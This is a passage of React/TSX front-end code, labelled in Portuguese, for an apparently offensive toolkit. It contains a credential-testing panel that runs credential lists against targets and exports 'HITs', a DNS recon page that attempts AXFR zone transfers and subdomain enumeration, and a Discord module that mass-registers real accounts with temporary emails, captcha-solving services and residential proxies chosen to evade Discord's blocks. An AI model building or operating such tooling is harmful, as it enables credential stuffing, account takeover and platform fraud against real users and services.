                    </select>
                    <button
                      className="lb-cred-mini-btn"
                      onClick={() => setCredText("")}
                      disabled={credRunning || !credText}
                    >✕ Limpar</button>
                    <button
                      className="lb-cred-mini-btn"
                      title="Apaga o histórico de credenciais já testadas para este alvo"
                      onClick={() => {
                        clearCheckedCreds(credTarget);
                        setCredSkipped(0);
                        addLog(`🗑 Histórico limpo para: ${CRED_TARGETS[credTarget]?.label ?? credTarget}`, "info");
                      }}
                      disabled={credRunning}
                    >🗑 Histórico</button>
                    <input ref={credFileRef} type="file" accept=".txt,.csv" style={{ display: "none" }} onChange={handleCredFileUpload} />
                    <div style={{ flex: 1 }} />
                    {credSkipped > 0 && !credRunning && (
                      <span style={{ fontSize: "11px", color: "var(--color-text-muted)", alignSelf: "center", marginRight: "6px" }}>
                        ⏭ {credSkipped} ignoradas
                      </span>
                    )}
                    {!credRunning ? (
                      <button
                        className="lb-cred-start-btn"
                        onClick={handleCredStart}
                        disabled={!credText.trim()}
                      >
                        ▶ Iniciar
                      </button>
                    ) : (
                      <>
                        <button
                          className="lb-cred-mini-btn"
                          style={{ background: credPaused ? "rgba(46,204,113,0.15)" : "rgba(243,156,18,0.15)", borderColor: credPaused ? "rgba(46,204,113,0.5)" : "rgba(243,156,18,0.5)", color: credPaused ? "#2ecc71" : "#f39c12" }}
                          onClick={credPaused ? handleCredResume : handleCredPause}
                        >
                          {credPaused ? "▶ Retomar" : "⏸ Pausar"}
                        </button>
                        <button className="lb-cred-stop-btn" onClick={handleCredStop}>
                          ⏹ Parar
                        </button>
                      </>
                    )}
                  </div>
                </section>

                {/* Results tabs — HIT / FAIL */}
                {(credRunning || credDone > 0) && (
                  <section className="lb-cred-section lb-cred-tabs-section">
                    {/* Tab header */}
                    <div className="lb-cred-tab-bar">
                      <button
                        className={`lb-cred-tab-btn ${credTab === "hit" ? "lb-cred-tab-btn--active lb-cred-tab-btn--hit" : ""}`}
                        onClick={() => setCredTab("hit")}
                      >
                        ✅ HITs
                        <span className="lb-cred-tab-badge lb-cred-tab-badge--hit">{credHits.length}</span>
                      </button>
                      <button
                        className={`lb-cred-tab-btn ${credTab === "fail" ? "lb-cred-tab-btn--active lb-cred-tab-btn--fail" : ""}`}
                        onClick={() => setCredTab("fail")}
                      >
                        ❌ FAILs
                        <span className="lb-cred-tab-badge lb-cred-tab-badge--fail">{credFails}</span>
                      </button>
                      <button
                        className={`lb-cred-tab-btn ${credTab === "error" ? "lb-cred-tab-btn--active lb-cred-tab-btn--error" : ""}`}
                        onClick={() => setCredTab("error")}
                      >
                        ⚠️ ERRORs
                        <span className="lb-cred-tab-badge lb-cred-tab-badge--error">{credErrors}</span>
                      </button>
                      {credTab === "hit" && credHits.length > 0 && (
                        <>
                          <button className="lb-cred-mini-btn lb-cred-mini-btn--gold" onClick={exportCredHits} style={{ marginLeft: "auto" }}>
                            ⬇ Exportar
                          </button>
                          <button
                            className="lb-cred-mini-btn"
                            title="Copiar HITs para área de transferência"
                            onClick={() => {
                              const txt = credHits.map(h => h.detail ? `${h.credential} | ${h.detail}` : h.credential).join("\n");
                              navigator.clipboard.writeText(txt).then(() => addToast("geass","HITs copiados",`${credHits.length} HITs copiados`)).catch(() => {});
                            }}
                          >📋 Copiar</button>
                        </>
                      )}
                    </div>

                    {/* HIT filter */}
                    {credTab === "hit" && credHits.length > 0 && (
                      <div style={{ padding: "6px 10px 0" }}>
                        <input
                          type="text"
                          placeholder="🔍 Filtrar HITs por detalhe..."
                          value={credHitFilter}
                          onChange={e => setCredHitFilter(e.target.value)}
                          style={{ width: "100%", background: "rgba(0,0,0,0.35)", border: "1px solid rgba(212,175,55,0.25)", borderRadius: 6, padding: "5px 10px", color: "var(--color-text)", fontSize: 12, boxSizing: "border-box", fontFamily: "var(--font-mono)" }}
                        />
                      </div>
                    )}

                    {/* HIT tab */}
                    {credTab === "hit" && (
                      <div className="lb-cred-results-list">
                        {credHits.length === 0 ? (
                          <div className="lb-cred-tab-empty">
                            {credRunning ? "⏳ Buscando hits..." : "Nenhum hit encontrado"}
                          </div>
                        ) : credHits.filter(r => !credHitFilter.trim() || (r.credential + " " + (r.detail ?? "")).toLowerCase().includes(credHitFilter.toLowerCase())).map((r, i) => (
                          <div key={i} className="lb-cred-row lb-cred-row--hit">
                            <span className="lb-cred-row-badge">HIT</span>
                            <div className="lb-cred-row-content">
                              <span className="lb-cred-row-cred">{r.credential}</span>
                              {r.detail && <span className="lb-cred-row-detail">{r.detail}</span>}
                            </div>
                          </div>
                        ))}
                      </div>
                    )}

                    {/* FAIL tab */}
                    {credTab === "fail" && (
                      <div className="lb-cred-results-list">
                        {credFailList.length === 0 ? (
                          <div className="lb-cred-tab-empty">
                            {credRunning ? "⏳ Processando..." : "Nenhum fail registrado"}
                          </div>
                        ) : credFailList.map((r, i) => (
                          <div key={i} className="lb-cred-row lb-cred-row--fail">
                            <span className="lb-cred-row-badge lb-badge--fail">FAIL</span>
                            <div className="lb-cred-row-content">
                              <span className="lb-cred-row-cred">{r.credential}</span>
                              {r.detail && <span className="lb-cred-row-detail">{r.detail}</span>}
                            </div>
                          </div>
                        ))}
                      </div>
                    )}

                    {/* ERROR tab */}
                    {credTab === "error" && (
                      <div className="lb-cred-results-list">
                        {credErrorList.length === 0 ? (
                          <div className="lb-cred-tab-empty">
                            {credRunning ? "⏳ Processando..." : "Nenhum erro registrado"}
                          </div>
                        ) : credErrorList.map((r, i) => (
                          <div key={i} className="lb-cred-row lb-cred-row--error">
                            <span className="lb-cred-row-badge lb-badge--error">ERROR</span>
                            <div className="lb-cred-row-content">
                              <span className="lb-cred-row-cred">{r.credential}</span>
                              {r.detail && <span className="lb-cred-row-detail">{r.detail}</span>}
                            </div>
                          </div>
                        ))}
                      </div>
                    )}
                  </section>
                )}
              </div>
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════
            DNS RECON PAGE
        ══════════════════════════════════════════════ */}
        {activePage === "dns" && (
          <div className="lb-cred-page">
            <div className="lb-cred-layout">
              <div className="lb-cred-left" style={{ maxWidth: 480 }}>

                {/* Search */}
                <section className="lb-cred-section">
                  <div className="lb-cred-section-header">
                    <span className="lb-cred-section-icon">🌐</span>
                    <h3 className="lb-cred-section-title">DNS Intelligence</h3>
                  </div>
                  <div style={{ display: "flex", gap: 8, marginBottom: 8 }}>
                    <input
                      className="lb-input"
                      style={{ flex: 1 }}
                      placeholder="ex: google.com ou https://meusite.com"
                      value={dnsQuery}
                      onChange={e => setDnsQuery(e.target.value)}
                      onKeyDown={e => {
                        if (e.key === "Enter" && !dnsLoading) {
                          const domain = dnsQuery.trim().replace(/^https?:\/\//, "").split("/")[0];
                          if (!domain) return;
                          setDnsLoading(true); setDnsError(""); setDnsResult(null);
                          fetch(`${BASE}/api/dns/recon?domain=${encodeURIComponent(domain)}`)
                            .then(r => r.json())
                            .then(d => { setDnsResult(d as Record<string, unknown>); setDnsLoading(false); })
                            .catch(err => { setDnsError(String(err)); setDnsLoading(false); });
                        }
                      }}
                    />
                    <button
                      className="lb-btn lb-btn--gold"
                      disabled={dnsLoading || !dnsQuery.trim()}
                      onClick={() => {
                        const domain = dnsQuery.trim().replace(/^https?:\/\//, "").split("/")[0];
                        if (!domain) return;
                        setDnsLoading(true); setDnsError(""); setDnsResult(null);
                        fetch(`${BASE}/api/dns/recon?domain=${encodeURIComponent(domain)}`)
                          .then(r => r.json())
                          .then(d => { setDnsResult(d as Record<string, unknown>); setDnsLoading(false); })
                          .catch(err => { setDnsError(String(err)); setDnsLoading(false); });
                      }}
                    >
                      {dnsLoading ? "🔍 Scaneando..." : "🔍 Escanear"}
                    </button>
                  </div>
                  {dnsError && <p style={{ color: "#e74c3c", fontSize: 12, marginTop: 6 }}>{dnsError}</p>}
                  {dnsLoading && (
                    <div style={{ padding: "12px 0", textAlign: "center", color: "#d4af37", fontSize: 13 }}>
                      ⏳ Resolvendo registros DNS, tentando AXFR, enumerando subdomínios...
                    </div>
                  )}
                </section>

                {/* Summary */}
                {dnsResult && (() => {
                  const summary = dnsResult.summary as Record<string, unknown> ?? {};
                  const providers = (summary.providers as string[]) ?? [];
                  const vuln = summary.axfrVulnerable as boolean;
                  return (
                    <section className="lb-cred-section">
                      <div className="lb-cred-section-header">
                        <span className="lb-cred-section-icon">📊</span>
                        <h3 className="lb-cred-section-title">Resumo — {dnsResult.domain as string}</h3>
                      </div>
                      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
                        {[
                          { label: "IPs", value: summary.totalIPs as number },
                          { label: "NS", value: summary.nsCount as number },
                          { label: "Subdomínios", value: summary.subdomainsFound as number },
                        ].map(({ label, value }) => (
                          <div key={label} style={{ flex: 1, minWidth: 80, padding: "10px 14px", background: "rgba(212,175,55,0.06)", border: "1px solid rgba(212,175,55,0.2)", borderRadius: 8, textAlign: "center" }}>
                            <div style={{ fontSize: 20, fontWeight: 800, color: "#d4af37" }}>{value}</div>
                            <div style={{ fontSize: 10, color: "#aaa", textTransform: "uppercase", letterSpacing: 1 }}>{label}</div>
                          </div>
                        ))}
                        <div style={{ flex: 1, minWidth: 80, padding: "10px 14px", background: vuln ? "rgba(231,76,60,0.12)" : "rgba(46,204,113,0.06)", border: `1px solid ${vuln ? "rgba(231,76,60,0.4)" : "rgba(46,204,113,0.2)"}`, borderRadius: 8, textAlign: "center" }}>
                          <div style={{ fontSize: 16, fontWeight: 800, color: vuln ? "#e74c3c" : "#2ecc71" }}>{vuln ? "⚠️ VULN" : "✓ OK"}</div>
                          <div style={{ fontSize: 10, color: "#aaa", textTransform: "uppercase", letterSpacing: 1 }}>AXFR</div>
                        </div>
                      </div>
                      {providers.length > 0 && (
                        <div style={{ marginTop: 8, display: "flex", gap: 6, flexWrap: "wrap" }}>
                          {providers.map(p => (
                            <span key={p} style={{ padding: "3px 10px", background: "rgba(212,175,55,0.1)", border: "1px solid rgba(212,175,55,0.3)", borderRadius: 12, fontSize: 11, color: "#d4af37" }}>{p}</span>
                          ))}
                          {(summary.dnssecEnabled as boolean) && (
                            <span style={{ padding: "3px 10px", background: "rgba(52,152,219,0.1)", border: "1px solid rgba(52,152,219,0.3)", borderRadius: 12, fontSize: 11, color: "#3498db" }}>🔐 DNSSEC</span>
                          )}
                        </div>
                      )}
                    </section>
                  );
                })()}
              </div>

              {/* Right: Records */}
              {dnsResult && (
                <div className="lb-cred-right" style={{ flex: 1, minWidth: 0 }}>
                  {/* DNS Records */}
                  {[
                    { icon: "🔵", label: "A Records (IPv4)", key: "A" },
                    { icon: "🟣", label: "AAAA Records (IPv6)", key: "AAAA" },
                    { icon: "📬", label: "MX Records", key: "MX" },
                    { icon: "📝", label: "TXT Records", key: "TXT" },
                    { icon: "🖧",  label: "NS Records",  key: "NS"  },
                    { icon: "🗂",  label: "SOA Record",   key: "SOA" },
                    { icon: "🔒", label: "CAA Records",  key: "CAA" },
                  ].map(({ icon, label, key }) => {
                    const recs = ((dnsResult.records as Record<string, string[]>)?.[key] ?? []);
                    if (recs.length === 0) return null;
                    return (
                      <section key={key} className="lb-cred-section" style={{ marginBottom: 8 }}>
                        <div className="lb-cred-section-header">
                          <span className="lb-cred-section-icon">{icon}</span>
                          <h3 className="lb-cred-section-title">{label}</h3>
                          <span style={{ marginLeft: "auto", fontSize: 11, color: "#888" }}>{recs.length}</span>
                        </div>
                        <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                          {recs.map((r, i) => (
                            <code key={i} style={{ padding: "4px 8px", background: "rgba(0,0,0,0.3)", borderRadius: 4, fontSize: 11, color: "#e8e8e8", wordBreak: "break-all" }}>{r}</code>
                          ))}
                        </div>
                      </section>
                    );
                  })}

                  {/* Subdomains */}
                  {(() => {
                    const subs = dnsResult.subdomains as string[] ?? [];
                    if (!Array.isArray(subs) || subs.length === 0) return null;
                    return (
                      <section className="lb-cred-section" style={{ marginBottom: 8 }}>
                        <div className="lb-cred-section-header">
                          <span className="lb-cred-section-icon">&#x1F52D;</span>
                          <h3 className="lb-cred-section-title">Subdom{"\u00ED"}nios Encontrados</h3>
                          <span style={{ marginLeft: "auto", fontSize: 11, color: "#2ecc71", fontWeight: 700 }}>{subs.length} hit{subs.length !== 1 ? "s" : ""}</span>
                        </div>
                        {subs.map((s, i) => (
                          <code key={i} style={{ display: "block", padding: "4px 8px", background: "rgba(46,204,113,0.07)", borderLeft: "2px solid rgba(46,204,113,0.4)", borderRadius: 4, fontSize: 11, color: "#e8e8e8", marginBottom: 3 }}>{s}</code>
                        ))}
                      </section>
                    );
                  })()}

                  {/* Secondary DNS sections — wrapped in Fragment to avoid TS depth-limit on 3rd direct child */}
                  <>
                  {/* NS Details with IPs */}
                  {(() => {
                    const nsDetails = dnsResult.nsDetails as Array<{ name: string; ips: string[]; providers: string[] }> ?? [];
                    if (nsDetails.length === 0) return null;
                    return (
                      <section className="lb-cred-section" style={{ marginBottom: 8 }}>
                        <div className="lb-cred-section-header">
                          <span className="lb-cred-section-icon">&#x1F5A7;</span>
                          <h3 className="lb-cred-section-title">NS Servers &mdash; Todos IPs</h3>
                        </div>
                        {nsDetails.map((ns, i) => (
                          <div key={i} style={{ marginBottom: 6, padding: "8px 10px", background: "rgba(0,0,0,0.25)", borderRadius: 6 }}>
                            <div style={{ fontWeight: 700, color: "#d4af37", fontSize: 12, marginBottom: 4 }}>{ns.name}</div>
                            {ns.ips.map((ip, j) => (
                              <div key={j} style={{ display: "flex", gap: 8, alignItems: "center", marginBottom: 2 }}>
                                <code style={{ fontSize: 11, color: "#e8e8e8" }}>{ip}</code>
                                <span style={{ fontSize: 10, color: "#888", background: "rgba(255,255,255,0.05)", padding: "1px 6px", borderRadius: 8 }}>{ns.providers[j]}</span>
                              </div>
                            ))}
                          </div>
                        ))}
                      </section>
                    );
                  })()}

                  {/* AXFR */}
                  {(() => {
                    const axfr = dnsResult.axfr as Array<{ ns: string; result: string }> ?? [];
                    if (axfr.length === 0) return null;
                    return (
                      <section className="lb-cred-section" style={{ marginBottom: 8 }}>
                        <div className="lb-cred-section-header">
                          <span className="lb-cred-section-icon">⚡</span>
                          <h3 className="lb-cred-section-title">AXFR Zone Transfer</h3>
                        </div>
                        {axfr.map((a, i) => (
                          <div key={i} style={{ marginBottom: 4, padding: "6px 10px", background: a.result.includes("ALLOWED") ? "rgba(231,76,60,0.1)" : "rgba(0,0,0,0.2)", borderLeft: `2px solid ${a.result.includes("ALLOWED") ? "#e74c3c" : "#555"}`, borderRadius: 4 }}>
                            <div style={{ fontSize: 10, color: "#888", marginBottom: 2 }}>{a.ns}</div>
                            <div style={{ fontSize: 12, color: a.result.includes("ALLOWED") ? "#e74c3c" : "#aaa" }}>{a.result}</div>
                          </div>
                        ))}
                      </section>
                    );
                  })()}

                  {/* Email Security */}
                  {(() => {
                    const es = dnsResult.emailSecurity as Record<string, string[]> ?? {};
                    return (
                      <section className="lb-cred-section" style={{ marginBottom: 8 }}>
                        <div className="lb-cred-section-header">
                          <span className="lb-cred-section-icon">📧</span>
                          <h3 className="lb-cred-section-title">Email Security</h3>
                        </div>
                        {[
                          { label: "SPF",   data: es.spf   ?? [] },
                          { label: "DMARC", data: es.dmarc ?? [] },
                          { label: "DKIM",  data: es.dkim  ?? [] },
                        ].map(({ label, data }) => (
                          <div key={label} style={{ marginBottom: 6 }}>
                            <div style={{ fontSize: 10, color: "#d4af37", fontWeight: 700, marginBottom: 3 }}>{label}</div>
                            {data.map((d, i) => (
                              <code key={i} style={{ display: "block", fontSize: 11, color: d.includes("Not") ? "#888" : "#e8e8e8", padding: "3px 8px", background: "rgba(0,0,0,0.2)", borderRadius: 3, wordBreak: "break-all", marginBottom: 2 }}>{d}</code>
                            ))}
                          </div>
                        ))}
                      </section>
                    );
                  })()}

                  {/* DNSSEC */}
                  {dnsResult.dnssec && (
                    <section className="lb-cred-section" style={{ marginBottom: 8 }}>
                      <div className="lb-cred-section-header">
                        <span className="lb-cred-section-icon">🔐</span>
                        <h3 className="lb-cred-section-title">DNSSEC</h3>
                      </div>
                      <code style={{ fontSize: 11, color: "#e8e8e8" }}>
                        {(dnsResult.dnssec as Record<string, string>).status}
                      </code>
                    </section>
                  )}
                  </>
                </div>
              )}
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════
            DISCORD PAGE
        ══════════════════════════════════════════════ */}
        {activePage === "discord" && (
          <div className="lb-cred-page">

            {/* Sub-tab nav */}
            <div style={{ display: "flex", gap: 6, marginBottom: 18 }}>
              {(["bot", "accounts"] as const).map(tab => (
                <button
                  key={tab}
                  onClick={() => {
                    setDiscordSubTab(tab);
                    if (tab === "accounts" && dAccounts.length === 0 && !dAccLoading) loadDAccounts();
                  }}
                  style={{
                    padding: "7px 20px", borderRadius: 8, fontSize: 13, fontWeight: 700, cursor: "pointer",
                    border: discordSubTab === tab ? "1.5px solid rgba(88,101,242,0.8)" : "1px solid rgba(255,255,255,0.1)",
                    background: discordSubTab === tab ? "rgba(88,101,242,0.18)" : "rgba(255,255,255,0.04)",
                    color: discordSubTab === tab ? "#7289da" : "#888",
                    transition: "all 0.15s",
                  }}
                >
                  {tab === "bot" ? "🤖 Bot" : "👥 Contas"}
                </button>
              ))}
            </div>

            {/* ── BOT sub-tab ─────────────────────────────────────── */}
            {discordSubTab === "bot" && (
            <div className="lb-cred-layout">

              {/* LEFT: Invite link + refresh */}
              <div className="lb-cred-left" style={{ maxWidth: 420 }}>

                {/* Invite link generator */}
                <section className="lb-cred-section">
                  <div className="lb-cred-section-header">
                    <span className="lb-cred-section-icon">🔗</span>
                    <h3 className="lb-cred-section-title">Link de Convite</h3>
                  </div>
                  <p style={{ fontSize: 12, color: "#aaa", marginBottom: 10, lineHeight: 1.5 }}>
                    Compartilhe este link com o administrador do servidor que deseja adicionar o bot. Bots do Discord não podem entrar em servidores automaticamente — um admin precisa autorizar.
                  </p>
                  {discordInviteUrl ? (
                    <>
                      <div style={{ display: "flex", gap: 8, marginBottom: 8 }}>
                        <input
                          className="lb-input"
                          style={{ flex: 1, fontSize: 11 }}
                          readOnly
                          value={discordInviteUrl}
                          onClick={e => (e.target as HTMLInputElement).select()}
                        />
                        <button
                          className={`lb-btn ${discordCopied ? "lb-btn--gold" : "lb-btn--gold"}`}
                          style={{ minWidth: 90 }}
                          onClick={() => {
                            navigator.clipboard.writeText(discordInviteUrl).then(() => {
                              setDiscordCopied(true);
                              setTimeout(() => setDiscordCopied(false), 2000);
                            }).catch(() => {});
                          }}
                        >
                          {discordCopied ? "✓ Copiado!" : "📋 Copiar"}
                        </button>
                      </div>
                      <a
                        href={discordInviteUrl}
                        target="_blank"
                        rel="noreferrer"
                        style={{ display: "inline-flex", alignItems: "center", gap: 6, padding: "7px 14px", background: "rgba(88,101,242,0.15)", border: "1px solid rgba(88,101,242,0.4)", borderRadius: 8, color: "#7289da", fontSize: 12, fontWeight: 600, textDecoration: "none" }}
                      >
                        🌐 Abrir link de autorização
                      </a>
                    </>
                  ) : discordLoading ? (
                    <div style={{ color: "#d4af37", fontSize: 12 }}>⏳ Carregando...</div>
                  ) : (
                    <div style={{ color: "#888", fontSize: 12 }}>Clique em "Recarregar" para gerar o link.</div>
                  )}
                </section>

                {/* Bot info / refresh */}
                <section className="lb-cred-section">
                  <div className="lb-cred-section-header">
                    <span className="lb-cred-section-icon">🤖</span>
                    <h3 className="lb-cred-section-title">Status do Bot</h3>
                  </div>
                  <div style={{ display: "flex", gap: 8, alignItems: "center", marginBottom: 10 }}>
                    <div style={{ flex: 1 }}>
                      {discordAppId && (
                        <div style={{ fontSize: 11, color: "#888" }}>
                          Application ID: <code style={{ color: "#d4af37", background: "rgba(0,0,0,0.3)", padding: "1px 5px", borderRadius: 3 }}>{discordAppId}</code>
                        </div>
                      )}
                      <div style={{ marginTop: 4, fontSize: 11, color: "#888" }}>
                        Servidores: <span style={{ color: "#2ecc71", fontWeight: 700 }}>{discordGuilds.length}</span>
                      </div>
                    </div>
                    <button
                      className="lb-btn lb-btn--gold"
                      style={{ padding: "6px 14px", fontSize: 12 }}
                      disabled={discordLoading}
                      onClick={() => {
                        setDiscordLoading(true);
                        setDiscordError("");
                        Promise.all([
                          fetch(`${BASE}/api/discord/guilds`).then(r => r.json()),
                          fetch(`${BASE}/api/discord/invite-link`).then(r => r.json()),
                        ]).then(([gData, iData]) => {
                          const gd = gData as { guilds?: DiscordGuild[]; error?: string };
                          const id = iData as { url?: string; applicationId?: string };
                          if (gd.guilds) setDiscordGuilds(gd.guilds);
                          else setDiscordError(gd.error ?? "Erro ao carregar servidores");
                          if (id.url) setDiscordInviteUrl(id.url);
                          if (id.applicationId) setDiscordAppId(id.applicationId);
                          setDiscordLoading(false);
                        }).catch(err => { setDiscordError(String(err)); setDiscordLoading(false); });
                      }}
                    >
                      {discordLoading ? "⏳ Carregando..." : "↺ Recarregar"}
                    </button>
                  </div>
                  {discordError && (
                    <div style={{ color: "#e74c3c", fontSize: 12, padding: "8px 10px", background: "rgba(231,76,60,0.08)", borderRadius: 6, border: "1px solid rgba(231,76,60,0.2)" }}>
                      ⚠ {discordError}
                    </div>
                  )}
                </section>

              </div>

              {/* RIGHT: Guild list */}
              <div className="lb-cred-right" style={{ flex: 1, minWidth: 0 }}>
                <section className="lb-cred-section">
                  <div className="lb-cred-section-header">
                    <span className="lb-cred-section-icon">🏰</span>
                    <h3 className="lb-cred-section-title">Servidores do Bot</h3>
                    <span style={{ marginLeft: "auto", fontSize: 11, color: "#2ecc71", fontWeight: 700 }}>
                      {discordGuilds.length} servidor{discordGuilds.length !== 1 ? "es" : ""}
                    </span>
                  </div>

                  {discordLoading && discordGuilds.length === 0 && (
                    <div style={{ padding: "20px", textAlign: "center", color: "#d4af37", fontSize: 13 }}>
                      ⏳ Carregando servidores...
                    </div>
                  )}

                  {!discordLoading && discordGuilds.length === 0 && !discordError && (
                    <div style={{ padding: "20px", textAlign: "center", color: "#666", fontSize: 13 }}>
                      Nenhum servidor encontrado. O bot pode estar offline ou o token não está configurado.
                    </div>
                  )}

                  <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                    {discordGuilds.map(g => (
                      <div
                        key={g.id}
                        style={{
                          display: "flex", alignItems: "center", gap: 12,
                          padding: "10px 14px",
                          background: "rgba(88,101,242,0.05)",
                          border: "1px solid rgba(88,101,242,0.15)",
                          borderRadius: 8,
                        }}
                      >
                        {g.icon ? (
                          <img
                            src={g.icon}
                            alt={g.name}
                            style={{ width: 36, height: 36, borderRadius: "50%", objectFit: "cover", border: "2px solid rgba(88,101,242,0.3)", flexShrink: 0 }}
                          />
                        ) : (
                          <div style={{ width: 36, height: 36, borderRadius: "50%", background: "rgba(88,101,242,0.2)", border: "2px solid rgba(88,101,242,0.3)", flexShrink: 0, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 16 }}>
                            🏰
                          </div>
                        )}
                        <div style={{ flex: 1, minWidth: 0 }}>
                          <div style={{ fontWeight: 700, color: "#e8e8e8", fontSize: 13, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>{g.name}</div>
                          <div style={{ fontSize: 10, color: "#666", fontFamily: "var(--font-mono)" }}>{g.id}</div>
                        </div>
                        <button
                          className="lb-btn"
                          style={{
                            padding: "5px 12px", fontSize: 11, flexShrink: 0,
                            background: discordLeavingId === g.id ? "rgba(231,76,60,0.3)" : "rgba(231,76,60,0.1)",
                            border: "1px solid rgba(231,76,60,0.4)",
                            color: "#e74c3c",
                            borderRadius: 6,
                          }}
                          disabled={discordLeavingId === g.id}
                          onClick={() => {
                            if (!confirm(`Sair do servidor "${g.name}"?`)) return;
                            setDiscordLeavingId(g.id);
                            fetch(`${BASE}/api/discord/guilds/${g.id}`, { method: "DELETE" })
                              .then(r => r.json())
                              .then((d: { ok?: boolean; error?: string }) => {
                                if (d.ok) {
                                  setDiscordGuilds(prev => prev.filter(x => x.id !== g.id));
                                  addLog(`🤖 Bot saiu do servidor: ${g.name}`, "success");
                                } else {
                                  setDiscordError(d.error ?? "Erro ao sair do servidor");
                                }
                                setDiscordLeavingId(null);
                              })
                              .catch(err => { setDiscordError(String(err)); setDiscordLeavingId(null); });
                          }}
                        >
                          {discordLeavingId === g.id ? "⏳ Saindo..." : "✕ Sair"}
                        </button>
                      </div>
                    ))}
                  </div>
                </section>
              </div>

            </div>
            )}

            {/* ── ACCOUNTS sub-tab ─────────────────────────────── */}
            {discordSubTab === "accounts" && (
            <div className="lb-cred-layout" style={{ alignItems: "flex-start" }}>

              {/* LEFT — account list + add */}
              <div className="lb-cred-left" style={{ maxWidth: 420 }}>

                {/* ── AUTO CREATE ── */}
                <section className="lb-cred-section" style={{ borderColor: "rgba(88,101,242,0.35)" }}>
                  <div className="lb-cred-section-header">
                    <span className="lb-cred-section-icon">⚡</span>
                    <h3 className="lb-cred-section-title" style={{ color: "#7289da" }}>Criar Contas Automaticamente</h3>
                  </div>
                  <p style={{ fontSize: 11, color: "#999", marginBottom: 8, lineHeight: 1.5 }}>
                    Registra contas reais no Discord usando emails temporários.
                  </p>
                  <div style={{ background: "rgba(255,193,7,0.06)", border: "1px solid rgba(255,193,7,0.25)", borderRadius: 6, padding: "7px 10px", marginBottom: 12, fontSize: 11, color: "#cca300", lineHeight: 1.6 }}>
                    ⚠️ IPs de datacenter são bloqueados pelo Discord. Use um <strong>proxy residencial</strong> para melhor taxa de sucesso. Para captcha garantido, use <strong>2Captcha</strong> ou <strong>CapMonster</strong> (~$0.001/conta).
                  </div>

                  <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8, marginBottom: 8 }}>
                    <div>
                      <label style={{ fontSize: 11, color: "#888", display: "block", marginBottom: 3 }}>Quantidade (máx. 20)</label>
                      <input
                        type="number" min={1} max={20}
                        className="lb-input"
                        style={{ width: "100%", fontSize: 12 }}
                        value={dCreateCount}
                        onChange={e => setDCreateCount(Math.max(1, Math.min(20, Number(e.target.value))))}
                      />
                    </div>
                    <div>
                      <label style={{ fontSize: 11, color: "#888", display: "block", marginBottom: 3 }}>Delay entre contas (ms)</label>
                      <input
                        type="number" min={2000} max={30000} step={500}
                        className="lb-input"
                        style={{ width: "100%", fontSize: 12 }}
                        value={dCreateDelay}
                        onChange={e => setDCreateDelay(Number(e.target.value))}
                      />
                    </div>
                  </div>

                  <label style={{ fontSize: 11, color: "#888", display: "block", marginBottom: 3 }}>Solver de Captcha</label>
                  <div style={{ display: "flex", gap: 6, marginBottom: 8 }}>
                    {([
                      { id: "builtin",    label: "🤖 IA (Grátis)" },
                      { id: "2captcha",   label: "2Captcha" },
                      { id: "capmonster", label: "CapMonster" },
                    ] as const).map(s => (
                      <button
                        key={s.id}
                        onClick={() => setDCreateService(s.id)}
                        style={{
                          flex: 1, padding: "6px", borderRadius: 6, fontSize: 11, fontWeight: 700, cursor: "pointer",
                          border: dCreateService === s.id ? "1.5px solid rgba(88,101,242,0.7)" : "1px solid rgba(255,255,255,0.08)",
                          background: dCreateService === s.id ? "rgba(88,101,242,0.15)" : "rgba(255,255,255,0.03)",
                          color: dCreateService === s.id ? "#7289da" : "#666",
                        }}
                      >
                        {s.label}
                      </button>
                    ))}
                  </div>
                  {dCreateService === "builtin" && (
                    <div style={{ background: "rgba(88,101,242,0.06)", border: "1px solid rgba(88,101,242,0.2)", borderRadius: 6, padding: "6px 10px", marginBottom: 8, fontSize: 11, color: "#7289da", lineHeight: 1.5 }}>
                      🤖 Solver de IA funciona melhor quando o Discord não exige captcha (IPs residenciais confiáveis). Para IPs de datacenter, use 2Captcha ou CapMonster para garantia.
                    </div>
                  )}

                  {dCreateService !== "builtin" && (
                    <>
                      <label style={{ fontSize: 11, color: "#888", display: "block", marginBottom: 3 }}>
                        API Key do captcha
                      </label>
                      <input
                        className="lb-input"
                        type="password"
                        style={{ width: "100%", marginBottom: 8, fontFamily: "var(--font-mono)", fontSize: 11 }}
                        placeholder="Sua API key do 2captcha / capmonster..."
                        value={dCreateApiKey}
                        onChange={e => setDCreateApiKey(e.target.value)}
                      />
                    </>
                  )}

                  <label style={{ fontSize: 11, color: "#888", display: "block", marginBottom: 3 }}>
                    Proxy HTTP/S <span style={{ color: "#666" }}>(residencial recomendado — Discord bloqueia datacenter)</span>
                  </label>
                  <div style={{ display: "flex", gap: 6, marginBottom: 6 }}>
                    <button
                      onClick={() => setDUseResidential(!dUseResidential)}
                      style={{
                        padding: "6px 10px", borderRadius: 6, fontSize: 11, fontWeight: 700, cursor: "pointer",
                        border: dUseResidential ? "1.5px solid rgba(46,204,113,0.6)" : "1px solid rgba(255,255,255,0.08)",
                        background: dUseResidential ? "rgba(46,204,113,0.12)" : "rgba(255,255,255,0.03)",
                        color: dUseResidential ? "#2ecc71" : "#666",
                        whiteSpace: "nowrap",
                      }}
                    >
                      🏠 {dUseResidential ? "Residencial ✓" : "Residencial"}
                    </button>
                    <input
                      className="lb-input"
                      type="text"
                      style={{ flex: 1, fontFamily: "var(--font-mono)", fontSize: 11, opacity: dUseResidential ? 0.4 : 1 }}
                      placeholder="http://user:pass@host:port  (ou use 🏠 Residencial)"
                      value={dCreateProxy}
                      onChange={e => { setDCreateProxy(e.target.value); if (e.target.value) setDUseResidential(false); }}
                      disabled={dUseResidential}
                    />
                    <button
                      className="lb-btn"
                      style={{ padding: "0 10px", fontSize: 11, whiteSpace: "nowrap", background: "rgba(46,204,113,0.08)", borderColor: "rgba(46,204,113,0.3)", color: "#2ecc71" }}
                      onClick={() => {
                        fetch(`${BASE}/api/discord/accounts/proxy-test`, {
                          method: "POST",
                          headers: { "Content-Type": "application/json" },
                          body: JSON.stringify({ proxy: dCreateProxy }),
                        })
                          .then(r => r.json())
                          .then((d: { ok?: boolean; ms?: number; gateway?: string; error?: string; usingProxy?: boolean }) => {
